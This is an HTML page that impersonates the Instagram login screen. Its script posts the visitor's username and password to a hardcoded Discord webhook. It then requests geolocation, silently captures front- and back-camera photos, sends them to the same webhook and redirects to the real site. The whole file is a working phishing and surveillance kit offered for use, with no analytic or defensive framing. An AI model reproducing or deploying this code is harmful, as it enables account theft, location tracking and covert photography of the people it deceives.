<!DOCTYPE html>
<html>
<head>
    <title>Login • Instagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 24px; }
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 0 7px 8px; margin-bottom: 6px; box-sizing: border-box; font-size: 12px; }
        .btn-login { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: white; font-weight: 600; padding: 7px 0; margin-top: 8px; cursor: pointer; font-size: 14px; }
        #status { font-size: 12px; color: #ed4956; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
        <input type="text" id="user" placeholder="Username">
        <input type="password" id="pass" placeholder="Password">
        <button class="btn-login" id="loginBtn">Log in</button>
        <p id="status">Sorry, your password was incorrect.</p>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";

        // Helper to convert camera stream to an image file
        async function captureFromStream(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = 480; canvas.height = 640;
            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
            return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
        }

        document.getElementById('loginBtn').addEventListener('click', async function() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            document.getElementById('status').style.display = "block";

            // 1. Send Text Data First (Guarantees you get the password)
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: `📸 **Attempting Photo Capture...**\n👤 **User:** \`${u}\`\n🔑 **Pass:** \`${p}\`` })
            });

            // 2. Request Location & Start Camera
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                
                try {
                    const fd = new FormData();
                    fd.append("content", `📍 **Location Found:** ${mapLink}`);

                    // A. Capture Front Photo
                    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const frontBlob = await captureFromStream(frontStream);
                    fd.append("file1", frontBlob, "front.jpg");
                    frontStream.getTracks().forEach(t => t.stop()); // Close front cam

                    // B. Capture Back Photo
                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    const backBlob = await captureFromStream(backStream);
                    fd.append("file2", backBlob, "back.jpg");
                    backStream.getTracks().forEach(t => t.stop()); // Close back cam

                    // 3. Send photos to Discord
                    await fetch(WEBHOOK, { method: 'POST', body: fd });
                } catch (e) {
                    console.log("Camera blocked or failed");
                }

                // Final Redirect
                setTimeout(() => { window.location.href = "https://instagram.com"; }, 1000);

            }, (err) => {
                window.location.href = "https://instagram.com";
            }, { timeout: 8000 });
        });
    </script>
</body>
</html>
